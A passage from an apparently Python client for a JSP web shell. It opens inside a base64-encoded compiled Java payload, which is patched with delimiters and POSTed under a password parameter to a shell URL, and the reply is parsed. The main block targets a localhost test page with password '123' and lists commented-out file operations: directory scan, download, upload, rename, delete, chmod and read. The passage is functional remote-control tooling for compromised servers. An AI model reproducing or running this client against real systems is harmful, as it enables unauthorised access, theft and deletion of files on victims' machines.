SnNwV3JpdGVyAQAFcHJpbnQBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9JbnRlZ2VyAQAIcGFyc2VJbnQBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEABmxlbmd0aAEAAygpSQEABChJKVYBAAZjaGFyQXQBAAQoSSlDAQAHaW5kZXhPZgEABChJKUkBABwoSSlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAFd3JpdGUBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAljb21wYXJlVG8BACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAFmdldERlY2xhcmVkQ29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEAC25ld0luc3RhbmNlAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARKExqYXZhL2lvL0ZpbGU7KVYBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAVjbG9zZQAhAFYAQgAAAAMAAQBXAFgAAAABAFkAWAAAAAEAWgBYAAAABQABAFsAXAABAF0AAAAvAAEAAQAAAAUqtwABsQAAAAIAXgAAAAYAAQAAABAAXwAA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'
    payload = b64encode(b64decode(payload).replace('------>|'.encode(), ra.encode()).replace('|<------'.encode(), rb.encode()).replace('argpath='.encode(), rc.encode()))

    b64dir = rd + b64encode(file.encode()).decode()
    postArg = {password: payload, rc:b64dir}

    return requestAndResponse(url, postArg, ra, rb)


def requestAndResponse(url, postArg, ra, rb):
    r = requests.post(url, postArg, timeout=0.8)
    rt = r.text

    # print(rt)
    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == ' + str(r.status_code))

    pattern = ra + '(.+)' + rb
    data = re.findall(pattern, rt, re.DOTALL)#.匹配\n
    if  data != []:
        if data[0].startswith('ERROR://'):
            raise Exception(data[0])
        else:
            return data[0]
    else:
        raise Exception('PassWord Error!')




if __name__ == '__main__':
    url = 'http://localhost:8088/MyJavaWebProject_war_exploded/index.jsp'
    password = '123'
    # print(TestConn(url, password))
    # print(scanDir(url, password, 'C:'))
    # print(downloadFile(url, password, 'C:/Users/r1ngs/Desktop/1.txt'))
    # print(uploadFile(url, password, '123456', 'C:/Users/r1ngs/Desktop/1.txt'))
    # print(renameFile(url, password, 'C:/Users/r1ngs/Desktop/123.txt', 'C:/Users/r1ngs/Desktop/1231.txt'))
    # print(deleteFile(url, password, 'C:/Users/r1ngs/Desktop/1231.txt'))
    # print(chmodFile(url, password, 'C:/Users/r1ngs/Desktop/123.txt', 'RRR'))
    print(readFile(url, password, 'C:/Users/r1ngs/Desktop/1231.txt'))